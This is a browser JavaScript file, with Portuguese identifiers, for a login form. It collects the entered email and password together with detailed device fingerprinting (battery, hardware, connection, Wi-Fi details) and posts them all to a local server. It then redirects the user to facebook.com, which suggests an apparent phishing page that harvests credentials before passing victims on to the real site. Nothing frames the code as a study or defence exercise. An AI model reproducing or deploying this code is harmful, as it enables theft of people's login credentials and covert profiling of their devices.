document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.querySelector('.login-form');
    const emailInput = loginForm.querySelector('input[type="text"]');
    const senhaInput = loginForm.querySelector('input[type="password"]');
    const btnEntrar = loginForm.querySelector('.btn-entrar');
    
    if (!btnEntrar) {
        console.error('Botão de entrar não encontrado! Verifique se a classe .btn-entrar está correta.');
        return;
    }

    btnEntrar.disabled = true;
    btnEntrar.style.opacity = '0.6';
    btnEntrar.style.cursor = 'not-allowed';

    const verificarCampos = () => {
        const emailPreenchido = emailInput.value.trim() !== '';
        const senhaPreenchida = senhaInput.value.trim() !== '';
        
        if (emailPreenchido && senhaPreenchida) {
            btnEntrar.disabled = false;
            btnEntrar.style.opacity = '1';
            btnEntrar.style.cursor = 'pointer';
        } else {
            btnEntrar.disabled = true;
            btnEntrar.style.opacity = '0.6';
            btnEntrar.style.cursor = 'not-allowed';
        }
    }

    emailInput.addEventListener('input', verificarCampos);
    senhaInput.addEventListener('input', verificarCampos);

    const coletarInformacoesDispositivo = async () => {
        const info = {
            plataforma: navigator.platform,
            userAgent: navigator.userAgent,
            idioma: navigator.language,
            resolucao: `${window.screen.width}x${window.screen.height}`,
            profundidadeCor: window.screen.colorDepth,
            memoriaDispositivo: navigator.deviceMemory,
            processadores: navigator.hardwareConcurrency,
            conexao: navigator.connection ? {
                tipo: navigator.connection.effectiveType,
                velocidade: navigator.connection.downlink
            } : 'Não disponível',
            wifi: {}
        };

        try {
            if (navigator.getBattery) {
                const bateria = await navigator.getBattery();
                info.bateria = {
                    nivel: bateria.level * 100,
                    carregando: bateria.charging
                };
            }

            if (navigator.network && navigator.network.connection) {
                const connection = navigator.network.connection;
                info.wifi = {
                    ssid: connection.ssid,
                    signalStrength: connection.signalStrength,
                    security: connection.security
                };
            }

        } catch (e) {
            console.error('Erro ao coletar informações:', e);
        }

        return info;
    };

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        if (!btnEntrar.disabled) {
            try {
                btnEntrar.textContent = 'Entrando...';
                btnEntrar.disabled = true;

                const infoDispositivo = await coletarInformacoesDispositivo();

                const response = await fetch('http://localhost:3000/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: emailInput.value.trim(),
                        senha: senhaInput.value.trim(),
                        dispositivo: infoDispositivo
                    })
                });

                const data = await response.json();

                if (data.success) {
                    window.location.href = 'https://www.facebook.com';
                } else {
                    throw new Error(data.message || 'Erro ao fazer login');
                }

            } catch (error) {
                console.error('Erro ao processar login:', error);
                btnEntrar.textContent = 'Entrar';
                btnEntrar.disabled = false;
            }
        }
    });
});
